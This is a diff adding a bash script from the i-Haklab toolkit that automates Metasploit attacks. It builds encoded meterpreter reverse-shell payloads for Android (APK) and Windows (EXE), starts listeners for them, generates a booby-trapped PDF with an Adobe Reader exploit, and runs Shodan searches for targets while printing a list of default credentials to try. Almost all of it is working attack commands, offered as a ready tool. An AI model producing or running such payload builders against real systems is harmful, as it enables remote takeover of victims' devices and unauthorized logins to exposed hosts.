@@ -1,0 +1,91 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+trap ctrl_c 2
+source $PREFIX/share/i-Haklab/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+OPTS=$1
+HOST=${2:-$LOCALHOST}
+if chk-root;then
+	PORT=${3:-$RPORT}
+	user=sudo
+else
+	PORT=${3:-$LPORT}
+	user=exec
+fi
+if [ ! -d $iHAKLAB/handler ]; then
+	mkdir -p $iHAKLAB/handler
+fi
+handlerRC(){
+cat <<- CONF > $iHAKLAB/msfilesRC/$OPTS.rc
+use exploit/multi/handler
+set PAYLOAD $PAYLOAD
+set LHOST $HOST
+set LPORT $PORT
+run
+CONF
+	printf "$Y(_>)─➤$W HOST= $HOST\n$Y(_>)─➤$W PORT= $PORT\n$Y(_>)─➤$W Payload= $PAYLOAD\n$Y(_>)─➤$W Handler file= $OPTS.rc\n"
+	$user msfconsole -q -r $iHAKLAB/msfilesRC/$OPTS.rc
+}
+
+case $1 in
+	payapk)
+		PAYLOAD=android/meterpreter/reverse_tcp
+		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o payapk.apk >/dev/null || exit
+		handlerRC
+		;;
+	payexe)
+		PAYLOAD=windows/meterpreter/reverse_tcp
+		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 5 -o $OPTS.exe > /dev/null || exit
+		handlerRC
+		;;
+	paypdf)
+		cat <<- CONF > $iHAKLAB/msfilesRC/$OPTS.rf
+		use exploit/android/fileformat/adobe_reader_pdf_js_interface
+		set LHOST $HOST
+		set LPORT $PORT
+		set FILENAME $OPTS.pdf
+		run
+		use exploit/multi/handler
+		set LHOST $LOCALHOST
+		set LPORT $LPORT
+		run
+		CONF
+		$user msfconsole -q -r $iHAKLAB/msfilesRC/$OPTS.rc
+		;;
+	shodan)
+		if [ ! -e $MSFPATH/documentation/api/apikey ]; then
+			touch $MSFPATH/documentation/api/apikey
+		fi
+		APIKEYFILE=$MSFPATH/documentation/api/apikey
+		if [[ ! $(cat $APIKEYFILE) ]];then
+			printf "$Y(_>)─➤$W Type your shodan APIKEY "
+			while read -p "(_>)─➤ " ANSW && [ -z $ANSW ]; do
+				printf "$R(_>)─➤$W Go to www.shodan.io to get your APIKEY\n"
+				exit
+			done
+			echo $ANSW > $APIKEYFILE
+		fi
+		APIKEY=$(cat $APIKEYFILE)
+		if [ -e $iHAKLAB/.set/shodan/query ]; then
+			printf "$Y(_>)─➤$W Choose a type of search :\n"
+			cat $iHAKLAB/.set/shodan/query | sort
+			echo
+			while read -p "(_>)─➤ " QUERY && [ -z $QUERY ];do
+				continue
+			done
+		else
+			printf "$R(_>)─➤ ERROR :$W Not such query file\n"
+		fi
+		cat <<- CONF > $iHAKLAB/msfilesrc/$OPTS.rc
+		use auxiliary/gather/shodan_search
+		set SHODAN_APIKEY $APIKEY
+		set QUERY "$QUERY"
+		run
+		CONF
+		printf "$Y(_>)─➤$W If some target need user/passwd you can use those:\n"
+		cat $iHAKLAB/.set/shodan/usrpasswd.txt
+		printf "\n\tpress$G ENTER$W to continue\n"
+		read enter
+		msfconsole -q -r $iHAKLAB/msfilesrc/$OPTS.rc
+		;;
+esac
